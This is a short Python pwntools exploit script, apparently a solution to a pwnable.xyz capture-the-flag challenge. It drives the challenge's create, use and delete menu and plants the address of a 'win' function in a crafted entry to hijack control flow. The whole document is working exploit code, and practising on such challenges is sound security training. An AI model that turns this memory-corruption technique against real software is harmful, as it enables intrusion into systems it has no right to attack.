from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30032)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
win = e.symbols['win']

def create(length,name,job):
	sla('>','1')
	sla('? \n',str(length))
	sa(':',name)
	sla('>',str(job))

def use():
	sla('>','2')

def delete(yesorno):
	sla('>','3')
	sa('(y/n)',yesorno)

create(100,'A'*100,1)
create(30,'B'*7+p64(win)+'B'*15,5)
use()

p.interactive()